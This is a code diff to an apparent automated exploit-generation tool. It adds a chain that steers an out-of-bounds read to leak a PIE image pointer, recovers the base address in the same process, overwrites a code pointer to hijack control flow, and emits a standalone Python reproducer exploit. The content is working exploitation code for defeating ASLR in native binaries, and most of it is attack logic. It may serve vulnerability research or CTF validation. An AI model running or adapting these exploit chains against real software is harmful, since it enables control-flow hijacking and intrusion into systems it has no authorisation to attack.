@@ -308,6 +308,16 @@ def chain_primitive_stage(ctx) -> dict:
                 leak_opt, writer, off, trig, base = hit
                 return _file_pie_l3(ctx, target, lead, vclass, win_name, win_vaddr=win_addr,
                                     leak_opt=leak_opt, writer=writer, off=off, trig=trig)
+            # The bare-option leak found no base -- STEER an out-of-bounds read to disclose an image
+            # pointer and consume it IN-PROCESS to relocate the win (the full PIE memory-corruption
+            # L3). This is the technique the chain used to stop short of.
+            hit2 = _pie_leak_write_chain(ctx, target, target_bytes, exe, win, opts, model, width,
+                                         workdir)
+            if hit2:
+                read_opt, ridx, writer, off, trig, base = hit2
+                return _file_pie_l3(ctx, target, lead, vclass, win_name, win_vaddr=win_addr,
+                                    leak_opt=read_opt, writer=writer, off=off, trig=trig,
+                                    leak_index=ridx)
             # The hijack's own bare-option leak did not recover a base -- but a confirmed DISCLOSURE
             # (the ASLR-defeat leak this very hijack needs) is itself a validated L3. Drive the
             # richer disclosure chains (steered OOB read / reclaimed-heap / stack sweep) before
@@ -485,26 +495,35 @@ def _pie_drain(proc, idle=0.25, total=3.0):
     return buf, (proc.poll() is None)
 
 
-def _pie_run(spawn, width, leak_opt, writer, off, trig, win_vaddr, target_bytes, *, corrupt):
+def _pie_run(spawn, width, leak_opt, writer, off, trig, win_vaddr, target_bytes, *, corrupt,
+             leak_fn=None):
     """One in-process leak-then-chain run (an honest ASLR defeat -- the leak and the overwrite
-    happen in the SAME process): drive the leak option, recover the base from what it discloses,
-    overwrite an adjacent code pointer with base+win_vaddr (or a corrupted value for the negative
-    control), trigger, and return (base, trigger_output). base is None when the leak did not
-    recover a base."""
+    happen in the SAME process): drive the leak, recover the base from what it discloses, overwrite
+    an adjacent code pointer with base+win_vaddr (or a corrupted value for the negative control),
+    trigger, and return (base, trigger_output). base is None when the leak did not recover a base.
+
+    `leak_fn(proc) -> base|None` overrides the default bare-option leak with a richer in-process
+    leak (e.g. a steered out-of-bounds READ that discloses an image pointer) -- it sends its own
+    leak input on `proc.stdin` and returns the base recovered LIVE in this very process, which is
+    what makes the subsequent relocate ASLR-honest. The default (None) sends `leak_opt` as a single
+    menu scalar and recovers the base from the pointers it prints."""
     from ..fuzz import menu
     from . import exploit
     proc = spawn()
     try:
         _pie_drain(proc)                                 # first menu
-        proc.stdin.write(menu._scalar(leak_opt.encode(), width)); proc.stdin.flush()
-        out, _ = _pie_drain(proc)
-        vals = [int(x, 16) for x in re.findall(rb"0x[0-9a-fA-F]+", out)]
-        # allow_single: accept a base anchored on a LONE disclosed image pointer when its page
-        # offset is unique across the image's symbols -- forgery-proof, and the same rule the
-        # disclose stages and detonate.reaches_runtime_address already use. Without it a target that
-        # leaks exactly one image pointer (the common case) yielded no base and the PIE hijack
-        # stopped at "leak-chain not confirmed" even though the leak was there.
-        base = exploit.recover_pie_base(vals, target_bytes, allow_single=True) if vals else None
+        if leak_fn is not None:
+            base = leak_fn(proc)
+        else:
+            proc.stdin.write(menu._scalar(leak_opt.encode(), width)); proc.stdin.flush()
+            out, _ = _pie_drain(proc)
+            vals = [int(x, 16) for x in re.findall(rb"0x[0-9a-fA-F]+", out)]
+            # allow_single: accept a base anchored on a LONE disclosed image pointer when its page
+            # offset is unique across the image's symbols -- forgery-proof, and the same rule the
+            # disclose stages and detonate.reaches_runtime_address already use. Without it a target
+            # that leaks exactly one image pointer (the common case) yielded no base and the PIE
+            # hijack stopped at "leak-chain not confirmed" even though the leak was there.
+            base = exploit.recover_pie_base(vals, target_bytes, allow_single=True) if vals else None
         if not base:
             return None, b""
         addr = (base + win_vaddr) if not corrupt else (base + win_vaddr) ^ 0xFFFF
@@ -564,6 +583,78 @@ def _pie_leak_chain(ctx, target_bytes, exe, win, opts, model, width, workdir):
                     ctx.progress(msg=f"PIE hijack: leak {leak_opt} -> base -> option {writer} "
                                      f"writes base+{win_vaddr:#x} at +{off} -> {win_name} ran")
                     return leak_opt, writer, off, trig, base
+    return None
+
+
+def _pie_leak_write_chain(ctx, target, target_bytes, exe, win, opts, model, width, workdir):
+    """The full in-process PIE relocate: when the bare-option leak (`_pie_leak_chain`) finds no
+    base, STEER an out-of-bounds READ to disclose an image pointer (the `_oob_read_disclose` recipe:
+    read option, index, and the image vaddr that index discloses), then in the SAME live process
+    re-run that steered leak, recover the base from it, and relocate the win over the adjacent code
+    pointer. The base is recovered LIVE in the write process (never carried across a process
+    boundary -- stale under ASLR), so it is an honest ASLR defeat. Confirmed by the win's output
+    under a negative control (a corrupted address must not win). Returns
+    (read_opt, read_index, writer, off, trig, base) or None.
+
+    This is the technique the PIE memory chain was missing: a confirmable disclosure consumed
+    in-process to finish the hijack, rather than stopping at "PIE leak-chain not confirmed"."""
+    from ..dynamic import oob_index
+    from ..fuzz import menu
+    from . import exploit
+    win_name, win_vaddr = win
+    try:
+        arrays = (oob_index._array_candidates(exploit.elf_objects_sized(target_bytes))
+                  or oob_index._array_candidates_symfree(Path(exe)))
+    except Exception:                                    # noqa: BLE001
+        arrays = []
+    if not arrays:
+        return None
+    spawn = _pie_spawn(workdir, exe)
+    # Ask for the PIE IMAGE base specifically (empty got/syms skips the libc branch): the win's
+    # vaddr is an image offset, so only the image base relocates it -- a libc leak, though easier,
+    # is the wrong base here.
+    recipe = _oob_read_disclose(ctx, spawn, width, opts, model, arrays, {}, {}, target_bytes)
+    if not recipe or recipe.get("kind") != "pie":
+        return None
+    read_opt, ridx = recipe["read_opt"], recipe["idx"]
+
+    def leak_fn(proc, _ro=read_opt, _ri=ridx):
+        # Replay the steered OOB read (option then index) and recover the base LIVE in THIS process.
+        # Parse decimal AND hex (a disclosed pointer may print either), then recover_pie_base matches
+        # the disclosed pointer's page offset against the image's own symbols -- forgery-proof, and
+        # robust to the exact index disclosing a different image pointer than the recipe-discovery
+        # run did (any image pointer yields the same base).
+        proc.stdin.write(menu._scalar(_ro.encode(), width)
+                         + menu._scalar(str(_ri).encode(), width))
+        proc.stdin.flush()
+        out, _ = _pie_drain(proc)
+        vals = _int_from_output(out)
+        return exploit.recover_pie_base(vals, target_bytes, allow_single=True) if vals else None
+
+    writers = [o for o in opts if o in model and "str" in model[o]] or list(opts)
+    triggers = list(opts) + [None]
+    attempts = 0
+    for writer in writers:
+        for off in range(8, 72, 8):
+            for trig in triggers:
+                if ctx.should_cancel() or attempts >= 160:
+                    return None
+                attempts += 1
+                base, pos = _pie_run(spawn, width, read_opt, writer, off, trig, win_vaddr,
+                                     target_bytes, corrupt=False, leak_fn=leak_fn)
+                if not base:
+                    continue
+                pos_lines = {ln for ln in pos.splitlines() if ln.strip()}
+                if not any(_WIN_OUT.search(ln) for ln in pos_lines):
+                    continue
+                _, neg = _pie_run(spawn, width, read_opt, writer, off, trig, win_vaddr,
+                                  target_bytes, corrupt=True, leak_fn=leak_fn)
+                neg_lines = {ln for ln in neg.splitlines() if ln.strip()}
+                if [ln for ln in pos_lines - neg_lines if _WIN_OUT.search(ln)]:
+                    ctx.progress(msg=(f"PIE hijack via steered OOB-read leak: {read_opt}[{ridx}] -> "
+                                      f"base -> option {writer} writes base+{win_vaddr:#x} at +{off} "
+                                      f"-> {win_name} ran"))
+                    return read_opt, ridx, writer, off, trig, base
     return None
 
 
@@ -1599,12 +1690,18 @@ def _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq, *, blame, write
             "metrics": {"chained": True, "level": "L3", "vclass": vclass, "offset": off}}
 
 
-def _pie_repro_script(win_name, win_vaddr, leak_opt, writer, off, trig) -> bytes:
+def _pie_repro_script(win_name, win_vaddr, leak_opt, writer, off, trig, leak_index=None) -> bytes:
     """A self-contained, stdlib-based reproducer: leak -> recover the PIE base from the target's own
     symbols -> overwrite the code pointer with base+win_vaddr -> trigger. The base recovery mirrors
     exploit.recover_pie_base (page-offset match, >=2 corroborating leaked slots), so the PoC is a
-    genuine ASLR defeat, not a hardcoded address."""
+    genuine ASLR defeat, not a hardcoded address.
+
+    When `leak_index` is given the leak is a STEERED out-of-bounds read: the leak option is followed
+    by that index so the read discloses an image pointer (the _oob_read_disclose recipe); otherwise
+    the leak option alone is expected to print a pointer."""
     trig_send = "" if trig is None else f"send({trig!r}+'\\n')\n"
+    leak_send = ("send(LEAK+'\\n'); out=drain()" if leak_index is None
+                 else f"send(LEAK+'\\n'); send(str({int(leak_index)})+'\\n'); out=drain()")
     return (
         "#!/usr/bin/env python3\n"
         "# PIE leak-then-chain reproducer (stdlib based). Usage: python3 exploit.py ./target.bin\n"
@@ -1647,7 +1744,7 @@ def _pie_repro_script(win_name, win_vaddr, leak_opt, writer, off, trig) -> bytes
         "    elif p.poll() is not None: break\n"
         "  return b\n"
         "def send(s): p.stdin.write(s.encode() if isinstance(s,str) else s); p.stdin.flush()\n"
-        "drain(); send(LEAK+'\\n'); out=drain()\n"
+        f"drain(); {leak_send}\n"
         "vals=[int(x,16) for x in re.findall(rb'0x[0-9a-fA-F]+',out)]\n"
         "base=recover(vals, syms(EXE))\n"
         "assert base, 'no base recovered from leak'\n"
@@ -1658,18 +1755,21 @@ def _pie_repro_script(win_name, win_vaddr, leak_opt, writer, off, trig) -> bytes
     ).encode()
 
 
-def _file_pie_l3(ctx, target, lead, vclass, win_name, *, win_vaddr, leak_opt, writer, off, trig):
+def _file_pie_l3(ctx, target, lead, vclass, win_name, *, win_vaddr, leak_opt, writer, off, trig,
+                 leak_index=None):
     """File a confirmed PIE leak-chain as an L3 verified PoC (bundle = target + a runnable
-    leak-then-chain reproducer)."""
+    leak-then-chain reproducer). `leak_index` (set for the steered out-of-bounds-read leak) bakes
+    the OOB index into the reproducer's leak step."""
     import json as _json
 
     from ...db.dao import FindingDAO, PocDAO
     from . import bundle
-    script = _pie_repro_script(win_name, win_vaddr, leak_opt, writer, off, trig)
+    script = _pie_repro_script(win_name, win_vaddr, leak_opt, writer, off, trig, leak_index)
     input_sha = ctx.put_artifact("pie-chain-repro", data=script)
+    _leakdesc = leak_opt if leak_index is None else f"{leak_opt}[{leak_index}] (steered OOB read)"
     meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
             "exploit": f"{vclass}->control-flow (PIE, leak-relocated)", "target": win_name,
-            "win_vaddr": hex(win_vaddr), "leak_option": leak_opt, "tool_version": TOOL_VERSION}
+            "win_vaddr": hex(win_vaddr), "leak_option": _leakdesc, "tool_version": TOOL_VERSION}
     data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
                         "stdin", [], None,
                         primitive={"type": vclass, "target": win_name, "offset": off,
@@ -1678,8 +1778,8 @@ def _file_pie_l3(ctx, target, lead, vclass, win_name, *, win_vaddr, leak_opt, wr
     poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                      signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
     trg = "program exit / normal use" if trig is None else f"menu option {trig}"
-    eff = (f"working PIE exploit ({vclass} -> control-flow hijack): leaked a pointer via option "
-           f"{leak_opt}, recovered the image base, then option {writer} overwrote an adjacent code "
+    eff = (f"working PIE exploit ({vclass} -> control-flow hijack): leaked a pointer via "
+           f"{_leakdesc}, recovered the image base, then option {writer} overwrote an adjacent code "
            f"pointer at +{off} with base+{win_vaddr:#x} ({win_name}); {trg} ran it. Shown in "
            f"ONE process (a real ASLR defeat) and confirmed by the win's output under a passing "
            f"negative control (a corrupted address does not win).")
